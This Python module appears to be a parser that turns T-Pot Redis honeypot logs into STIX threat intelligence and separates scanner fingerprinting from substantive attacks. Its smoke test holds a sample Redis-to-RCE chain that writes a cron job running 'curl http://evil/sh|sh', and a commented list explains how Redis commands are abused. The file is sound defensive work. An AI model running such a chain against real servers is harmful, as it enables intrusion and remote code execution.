"""Redishoneypot parser — fake Redis honeypot.

Redishoneypot listens on port 6379 and speaks the Redis RESP protocol
back at clients.  Internet-wide Redis scanners constantly fire `INFO`,
`PING`, and `COMMAND` at every reachable Redis instance to fingerprint
it; that is pure background-radiation reconnaissance and we treat it
as a drive-by.  Substantive sessions are the ones where the client
starts issuing dangerous administrative commands — `CONFIG SET dir`
(write-where), `SLAVEOF` / `REPLICAOF` (replication abuse for RCE),
`EVAL` (Lua sandbox abuse), `MODULE LOAD` (arbitrary module load) and
similar — i.e. the classic Redis-to-RCE attack chains.

Per V1_SPEC.md §5.12:

  T-Pot doc fields used:
    src_ip, commands_received

  Event correlation:
    one ES doc → one ParsedEvent → one AttackSession (default
    one-event-per-session correlator).  T-Pot's Redishoneypot index
    already records the per-connection command list in a single doc,
    so there is nothing to group across docs.

  STIX emitted:
    - IPv4-Addr
    - Sighting
    - Note with attempted commands (e.g. CONFIG SET dir, SLAVEOF, etc.)

  Substance filter (per LESSONS_LEARNED_FROM_V0.md §2):
    A session is substantive iff `commands_received` is non-empty AND
    contains at least one command outside the recon-only set
    {INFO, PING, COMMAND}.  Plain INFO / PING fingerprinting is drive-by;
    anything else — CONFIG, SLAVEOF, EVAL, MODULE LOAD, SET, AUTH probe,
    KEYS *, FLUSHALL, etc. — is substance.
"""

from __future__ import annotations

import logging
from typing import Optional

from tpot2cti.parsers import register
from tpot2cti.parsers.base import AttackSession, BaseParser, ParsedEvent

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Command sets
# ---------------------------------------------------------------------------

#: Recon-only Redis commands.  A session that issues ONLY these is
#: drive-by background radiation (mass scanners fingerprinting open
#: Redis instances).  Per V1_SPEC §5.12 we suppress these from the
#: full STIX graph and route them to the one-Sighting drive-by path.
_RECON_REDIS_CMDS: frozenset[str] = frozenset({"INFO", "PING", "COMMAND"})

#: Suspicious Redis commands — the high-value RCE / abuse vectors that
#: real attackers chain.  This set is documentation more than gate
#: logic: anything NOT in `_RECON_REDIS_CMDS` is treated as substance,
#: but we surface this set explicitly because it's what the Note
#: highlights and what we expect to see most often.  Per V1_SPEC §5.12.
_SUSPICIOUS_REDIS_CMDS: frozenset[str] = frozenset({
    "CONFIG",        # CONFIG SET dir / dbfilename — write-where primitive
    "SLAVEOF",       # replication-of malicious master → RCE via dlmalloc
    "REPLICAOF",     # SLAVEOF rename in newer Redis
    "EVAL",          # Lua sandbox surface
    "EVALSHA",
    "MODULE",        # MODULE LOAD → arbitrary native code
    "SCRIPT",        # SCRIPT LOAD pre-stage for EVALSHA chains
    "DEBUG",         # DEBUG SLEEP / OBJECT for DoS + leaks
    "FLUSHALL",      # destructive
    "FLUSHDB",
    "BGSAVE",        # write-where via RDB
    "SAVE",
    "AUTH",          # password guessing
    "SET",           # used to plant authorized_keys when chained with CONFIG SET dir
    "KEYS",          # KEYS * data enumeration
    "CLUSTER",       # CLUSTER RESET, CLUSTER FORGET — disruption
})


# ---------------------------------------------------------------------------
# Parser
# ---------------------------------------------------------------------------

class RedishoneypotParser(BaseParser):
    """Parser for T-Pot's Redishoneypot fake-Redis honeypot."""

    type_name = "Redishoneypot"

    # ──────────────────────────────────────────────────────────────────
    # parse() — one ES doc → one ParsedEvent
    # ──────────────────────────────────────────────────────────────────

    def parse(self, doc: dict) -> Optional[ParsedEvent]:
        """Convert a Redishoneypot ES doc into a ParsedEvent.

        Returns None for malformed docs (missing src_ip or @timestamp).
        Per V1_SPEC §5.12 we only consume src_ip + commands_received;
        the rest of the doc rides along on raw_doc.
        """
        src_ip = doc.get("src_ip")
        if not src_ip:
            logger.debug("redishoneypot: doc missing src_ip; skipping")
            return None

        ts = self._parse_timestamp(doc)
        if ts is None:
            logger.debug(
                "redishoneypot: doc missing/unparseable @timestamp; skipping"
            )
            return None

        commands = self._normalize_commands(doc.get("commands_received"))

        event = ParsedEvent(
            src_ip=str(src_ip),
            timestamp=ts,
            sensor_hostname=str(
                doc.get("t-pot_hostname")
                or (doc.get("host") or {}).get("name")
                or "unknown"
            ),
            event_type="Redishoneypot",
            src_port=self._safe_int(doc.get("src_port")),
            dst_port=self._safe_int(doc.get("dst_port") or doc.get("dest_port") or 6379),
            dst_ip=doc.get("dst_ip") or doc.get("dest_ip"),
            protocol="redis",
            raw_doc=doc,
        )
        self._populate_geoip(doc, event)

        # Stash the full normalized command list in meta — the builder
        # uses this verbatim to render the Note body.
        event.meta["commands_received"] = commands

        return event

    # ──────────────────────────────────────────────────────────────────
    # correlate() — default one-event-per-session is correct
    # ──────────────────────────────────────────────────────────────────
    # The Redishoneypot index already aggregates commands per connection
    # into a single doc, so there's nothing further to merge.  We also
    # mirror the command list onto session.commands so downstream
    # consumers can introspect via the session directly.

    def correlate(self, events):
        """One-event-per-session, copying commands_received onto
        session.commands so the substance signal lives on the session.
        """
        sessions: list[AttackSession] = []
        for e in events:
            s = AttackSession.from_event(e)
            cmds = e.meta.get("commands_received") or []
            if cmds:
                s.commands.extend(cmds)
            sessions.append(s)
        return sessions

    # ──────────────────────────────────────────────────────────────────
    # has_substance() — strict Redis-specific filter
    # ──────────────────────────────────────────────────────────────────

    def has_substance(self, session: AttackSession) -> bool:
        """Return True iff this session issued at least one command
        beyond the recon-only set {INFO, PING, COMMAND}.

        Per V1_SPEC §5.12 and LESSONS_LEARNED_FROM_V0.md §2, plain
        fingerprint chatter is drive-by; CONFIG / SLAVEOF / EVAL / MODULE
        LOAD / SET / etc. are substance.
        """
        if not session.events:
            return False
        commands = session.events[0].meta.get("commands_received") or []
        if not commands:
            return False
        for cmd in commands:
            verb = self._command_verb(cmd)
            if verb and verb not in _RECON_REDIS_CMDS:
                return True
        return False

    # ──────────────────────────────────────────────────────────────────
    # Helpers
    # ──────────────────────────────────────────────────────────────────

    @staticmethod
    def _normalize_commands(raw) -> list[str]:
        """Coerce `commands_received` to a list[str].

        T-Pot can encode this as a list of strings, a list of arrays
        (RESP-style ``[["CONFIG", "SET", "dir", "/tmp"], ...]``), or a
        single string.  We collapse each to a single line of text so
        the substance filter can do verb extraction and the Note can
        render it verbatim.
        """
        if raw is None:
            return []
        if isinstance(raw, str):
            return [raw]
        if isinstance(raw, list):
            out: list[str] = []
            for item in raw:
                if isinstance(item, str):
                    out.append(item)
                elif isinstance(item, list):
                    # RESP-array form → "CONFIG SET dir /tmp"
                    out.append(" ".join(str(x) for x in item))
                else:
                    out.append(str(item))
            return out
        return [str(raw)]

    @staticmethod
    def _command_verb(command: str) -> str:
        """Return the leading verb of a Redis command line, uppercased.

        Handles plain `"INFO"`, `"INFO server"`, `"  CONFIG  SET dir"`,
        etc.  Returns an empty string if the command line is empty.
        """
        if not command:
            return ""
        return command.strip().split(maxsplit=1)[0].upper() if command.strip() else ""

    @staticmethod
    def _safe_int(value) -> Optional[int]:
        if value is None:
            return None
        try:
            return int(value)
        except (TypeError, ValueError):
            return None


# Register on import
register(RedishoneypotParser())


# ---------------------------------------------------------------------------
# Smoke test
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    from datetime import datetime, timezone

    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")

    parser = RedishoneypotParser()
    now = datetime.now(timezone.utc)

    # ── Case 1: drive-by — INFO / PING only ───────────────────────────
    driveby_doc = {
        "@timestamp": now.isoformat(),
        "type": "Redishoneypot",
        "src_ip": "203.0.113.30",
        "dst_port": 6379,
        "t-pot_hostname": "node1",
        "commands_received": ["INFO", "PING", "COMMAND"],
        "geoip": {"country_iso_code": "US", "asn": 64500},
    }

    # ── Case 2: substantive — CONFIG SET + SLAVEOF chain ──────────────
    substantive_doc = {
        "@timestamp": now.isoformat(),
        "type": "Redishoneypot",
        "src_ip": "198.51.100.30",
        "dst_port": 6379,
        "t-pot_hostname": "node1",
        "commands_received": [
            "INFO",
            "CONFIG SET dir /var/spool/cron",
            "CONFIG SET dbfilename root",
            "SET x \"\\n* * * * * curl http://evil/sh|sh\\n\"",
            "SAVE",
            "SLAVEOF 1.2.3.4 6379",
        ],
        "geoip": {"country_iso_code": "RU", "asn": 12345},
    }

    # ── Case 3: substantive — EVAL only (Lua) ─────────────────────────
    eval_doc = {
        "@timestamp": now.isoformat(),
        "type": "Redishoneypot",
        "src_ip": "198.51.100.31",
        "dst_port": 6379,
        "t-pot_hostname": "node1",
        "commands_received": ["EVAL \"return redis.call('config', 'get', '*')\" 0"],
    }

    # ── Case 4: empty commands list — must be non-substantive ─────────
    empty_doc = {
        "@timestamp": now.isoformat(),
        "type": "Redishoneypot",
        "src_ip": "198.51.100.32",
        "dst_port": 6379,
        "t-pot_hostname": "node1",
        "commands_received": [],
    }

    de = parser.parse(driveby_doc)
    se = parser.parse(substantive_doc)
    ee = parser.parse(eval_doc)
    empty_e = parser.parse(empty_doc)
    assert de and se and ee and empty_e, "parse failed"

    ds = parser.correlate([de])[0]
    ss = parser.correlate([se])[0]
    es = parser.correlate([ee])[0]
    empty_s = parser.correlate([empty_e])[0]

    assert parser.has_substance(ds) is False, "INFO/PING/COMMAND must be drive-by"
    assert parser.has_substance(ss) is True, "CONFIG/SLAVEOF must be substantive"
    assert parser.has_substance(es) is True, "EVAL must be substantive"
    assert parser.has_substance(empty_s) is False, "empty must NOT be substantive"

    # Commands mirrored onto the session
    assert ss.commands and "CONFIG SET dir /var/spool/cron" in ss.commands

    print("OK")
